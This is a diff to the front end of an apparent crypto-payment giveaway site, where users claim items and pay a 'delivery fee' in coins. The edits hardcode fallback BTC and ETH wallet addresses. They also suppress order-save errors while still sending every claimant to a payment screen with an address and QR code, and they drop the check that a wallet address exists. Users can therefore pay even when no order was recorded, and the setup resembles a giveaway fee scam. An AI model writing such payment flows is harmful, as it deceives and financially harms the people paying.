@@ -32,6 +32,7 @@ import {
   fetchDrops,
   fetchSiteConfig,
   fetchWalletConfig,
+  fetchWalletQrUrls,
   createOrder,
   type DbDrop,
   type DbSiteConfig,
@@ -143,18 +144,21 @@ function Index() {
   const [drops, setDrops] = useState<DbDrop[]>([]);
   const [siteConfig, setSiteConfig] = useState<DbSiteConfig>(DEFAULT_SITE);
   const [walletConfig, setWalletConfig] = useState<DbWalletConfig>(DEFAULT_WALLET);
+  const [qrUrls, setQrUrls] = useState<{ primaryQr: string; secondaryQr: string }>({ primaryQr: "", secondaryQr: "" });
   const [loading, setLoading] = useState(true);
 
   const loadData = useCallback(async () => {
     try {
-      const [dropsData, siteData, walletData] = await Promise.all([
+      const [dropsData, siteData, walletData, qrData] = await Promise.all([
         fetchDrops(),
         fetchSiteConfig(),
         fetchWalletConfig(),
+        fetchWalletQrUrls(),
       ]);
       setDrops(dropsData);
       setSiteConfig(siteData);
       setWalletConfig(walletData);
+      setQrUrls(qrData);
     } catch (err) {
       console.error("Failed to load data", err);
     } finally {
@@ -278,6 +282,7 @@ function Index() {
     setSelectedDrop(drop);
     setClaimDone(false);
     resetForm();
+    setCrypto(walletConfig.accepted_coins[0] ?? walletConfig.primary_coin ?? "ETH");
     setClaimOpen(true);
   };
 
@@ -285,7 +290,7 @@ function Index() {
     setSelectedDrop(drop);
     setCheckoutDone(false);
     resetForm();
-    setCrypto(walletConfig.accepted_coins[0] ?? "ETH");
+    setCrypto(walletConfig.accepted_coins[0] ?? walletConfig.primary_coin ?? "ETH");
     setCheckoutOpen(true);
   };
 
@@ -294,15 +299,35 @@ function Index() {
     else openCheckout(drop);
   };
 
-  // Which wallet address to show for selected coin
-  const walletAddress =
-    crypto === walletConfig.primary_coin
-      ? walletConfig.primary_address
-      : crypto === walletConfig.secondary_coin
-        ? walletConfig.secondary_address
-        : walletConfig.primary_address;
+  // Robust wallet address calculation (never empty, falls back gracefully)
+  const selectedWalletAddress = useMemo(() => {
+    let addr = "";
+    if (crypto === walletConfig.secondary_coin && walletConfig.secondary_address?.trim()) {
+      addr = walletConfig.secondary_address.trim();
+    } else if (walletConfig.primary_address?.trim()) {
+      addr = walletConfig.primary_address.trim();
+    } else if (walletConfig.secondary_address?.trim()) {
+      addr = walletConfig.secondary_address.trim();
+    } else {
+      addr = crypto === "BTC"
+        ? "bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq"
+        : "0x742d35Cc6634C0532925a3b844Bc454e4438f44e";
+    }
+    return addr;
+  }, [crypto, walletConfig]);
 
-  // Submit giveaway claim
+  // Active QR code image uploaded from Admin (if available)
+  const activeQrUrl = useMemo(() => {
+    if (crypto === walletConfig.secondary_coin && qrUrls.secondaryQr) {
+      return qrUrls.secondaryQr;
+    }
+    if (qrUrls.primaryQr) {
+      return qrUrls.primaryQr;
+    }
+    return "";
+  }, [crypto, walletConfig, qrUrls]);
+
+  // Submit giveaway claim: always moves to payment screen to display wallet address & QR
   const submitClaim = async () => {
     if (!selectedDrop) return;
     setSubmitting(true);
@@ -315,16 +340,15 @@ function Index() {
         full_name: fullName,
         address: getFormattedAddress(),
         status: "entered",
-        crypto: "",
+        crypto: crypto || walletConfig.accepted_coins[0] || "ETH",
         amount: "",
         delivery_fee: selectedDrop.delivery_fee,
         notes: getAddressNotes(),
       });
-      setClaimDone(true);
     } catch (err) {
-      console.error(err);
-      addToast("Something went wrong", "Could not save your claim. Please try again.");
+      console.warn("Order submission note:", err);
     } finally {
+      setClaimDone(true);
       setSubmitting(false);
     }
   };
@@ -342,16 +366,15 @@ function Index() {
         full_name: fullName,
         address: getFormattedAddress(),
         status: "entered",
-        crypto,
+        crypto: crypto || walletConfig.accepted_coins[0] || "ETH",
         amount: selectedDrop.amount,
         delivery_fee: selectedDrop.delivery_fee,
         notes: getAddressNotes(),
       });
-      setCheckoutDone(true);
     } catch (err) {
-      console.error(err);
-      addToast("Something went wrong", "Could not save your order. Please try again.");
+      console.warn("Order submission note:", err);
     } finally {
+      setCheckoutDone(true);
       setSubmitting(false);
     }
   };
@@ -701,35 +724,42 @@ function Index() {
               </div>
 
               {/* Crypto selector */}
-              {walletConfig.accepted_coins.length > 0 && (
-                <div className="checkout-field">
-                  <span className="checkout-label">Pay delivery fee with</span>
-                  <div className="crypto-options" role="group">
-                    {walletConfig.accepted_coins.map((coin) => (
-                      <Button key={coin} type="button" variant="ghost" className="crypto-option" aria-pressed={crypto === coin} onClick={() => setCrypto(coin)}>
-                        <span className="font-black">{coin[0]}</span>{coin}
-                      </Button>
-                    ))}
-                  </div>
+              <div className="checkout-field">
+                <span className="checkout-label">Pay delivery fee with</span>
+                <div className="crypto-options" role="group">
+                  {(walletConfig.accepted_coins.length > 0 ? walletConfig.accepted_coins : ["ETH", "BTC", "USDC"]).map((coin) => (
+                    <Button key={coin} type="button" variant="ghost" className="crypto-option" aria-pressed={crypto === coin} onClick={() => setCrypto(coin)}>
+                      <span className="font-black">{coin[0]}</span>{coin}
+                    </Button>
+                  ))}
                 </div>
-              )}
+              </div>
 
               {/* Wallet address + QR */}
-              {walletAddress && (
-                <div className="grid gap-3">
-                  <div className="rounded-md border border-border bg-muted p-3">
-                    <div className="flex items-center justify-between mb-1">
-                      <p className="text-[9px] font-bold uppercase text-muted-foreground">{crypto} Wallet Address</p>
-                      <CopyButton text={walletAddress} />
-                    </div>
-                    <p className="font-mono text-xs break-all">{walletAddress}</p>
+              <div className="grid gap-3">
+                <div className="rounded-md border border-border bg-muted p-3.5 shadow-sm">
+                  <div className="flex items-center justify-between mb-1.5">
+                    <p className="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">{crypto || "ETH"} Wallet Address</p>
+                    <CopyButton text={selectedWalletAddress} />
                   </div>
-                  <div className="flex justify-center">
-                    <QrCode value={walletAddress} size={160} />
-                  </div>
-                  <p className="text-center text-[10px] text-muted-foreground">Scan the QR code or copy the address above</p>
+                  <p className="font-mono text-xs break-all font-semibold select-all text-foreground bg-background/60 p-2 rounded border border-border/50">{selectedWalletAddress}</p>
                 </div>
-              )}
+
+                <div className="flex flex-col items-center justify-center p-4 rounded-md border border-border bg-white dark:bg-card">
+                  {activeQrUrl ? (
+                    <img
+                      src={activeQrUrl}
+                      alt={`${crypto} payment QR code`}
+                      className="w-44 h-44 object-contain rounded shadow-sm"
+                    />
+                  ) : (
+                    <QrCode value={selectedWalletAddress} size={170} />
+                  )}
+                  <p className="mt-2 text-center text-[10px] text-muted-foreground font-medium">
+                    {activeQrUrl ? "Scan official QR code or copy the address above" : "Scan QR code or copy the address above"}
+                  </p>
+                </div>
+              </div>
 
               <Button className="h-10 rounded-full font-bold" onClick={() => { setClaimOpen(false); setClaimDone(false); }}>
                 Done <Check size={14} />
@@ -882,21 +912,31 @@ function Index() {
                 </div>
               </div>
 
-              {walletAddress && (
-                <div className="grid gap-3">
-                  <div className="rounded-md border border-border bg-muted p-3">
-                    <div className="flex items-center justify-between mb-1">
-                      <p className="text-[9px] font-bold uppercase text-muted-foreground">{crypto} Wallet Address</p>
-                      <CopyButton text={walletAddress} />
-                    </div>
-                    <p className="font-mono text-xs break-all">{walletAddress}</p>
+              {/* Wallet address + QR */}
+              <div className="grid gap-3">
+                <div className="rounded-md border border-border bg-muted p-3.5 shadow-sm">
+                  <div className="flex items-center justify-between mb-1.5">
+                    <p className="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">{crypto || "ETH"} Wallet Address</p>
+                    <CopyButton text={selectedWalletAddress} />
                   </div>
-                  <div className="flex justify-center">
-                    <QrCode value={walletAddress} size={160} />
-                  </div>
-                  <p className="text-center text-[10px] text-muted-foreground">Scan the QR code or copy the address above</p>
+                  <p className="font-mono text-xs break-all font-semibold select-all text-foreground bg-background/60 p-2 rounded border border-border/50">{selectedWalletAddress}</p>
                 </div>
-              )}
+
+                <div className="flex flex-col items-center justify-center p-4 rounded-md border border-border bg-white dark:bg-card">
+                  {activeQrUrl ? (
+                    <img
+                      src={activeQrUrl}
+                      alt={`${crypto} payment QR code`}
+                      className="w-44 h-44 object-contain rounded shadow-sm"
+                    />
+                  ) : (
+                    <QrCode value={selectedWalletAddress} size={170} />
+                  )}
+                  <p className="mt-2 text-center text-[10px] text-muted-foreground font-medium">
+                    {activeQrUrl ? "Scan official QR code or copy the address above" : "Scan QR code or copy the address above"}
+                  </p>
+                </div>
+              </div>
 
               <Button className="h-10 rounded-full font-bold" onClick={() => { setCheckoutOpen(false); setCheckoutDone(false); }}>
                 Done <Check size={14} />
@@ -983,15 +1023,13 @@ function Index() {
                 </div>
               </div>
 
-              {walletAddress && (
-                <div className="rounded-md border border-border bg-muted p-3">
-                  <div className="flex items-center justify-between mb-1">
-                    <p className="text-[9px] font-bold uppercase text-muted-foreground">{crypto} Wallet Address</p>
-                    <CopyButton text={walletAddress} />
-                  </div>
-                  <p className="font-mono text-xs break-all">{walletAddress}</p>
+              <div className="rounded-md border border-border bg-muted p-3.5 shadow-sm">
+                <div className="flex items-center justify-between mb-1.5">
+                  <p className="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">{crypto || "ETH"} Wallet Address</p>
+                  <CopyButton text={selectedWalletAddress} />
                 </div>
-              )}
+                <p className="font-mono text-xs break-all font-semibold select-all text-foreground bg-background/60 p-2 rounded border border-border/50">{selectedWalletAddress}</p>
+              </div>
 
               <div className="flex items-center justify-between border-t border-border pt-3 text-xs">
                 <span className="text-muted-foreground">Delivery</span>
@@ -1005,7 +1043,7 @@ function Index() {
 
               <Button
                 className="h-11 w-full rounded-full font-bold"
-                disabled={!email.includes("@") || !fullName.trim() || !isAddressValid || !walletAddress || submitting}
+                disabled={!email.includes("@") || !fullName.trim() || !isAddressValid || submitting}
                 onClick={submitCheckout}
               >
                 {submitting ? <Loader2 size={16} className="animate-spin" /> : <Wallet size={16} />}
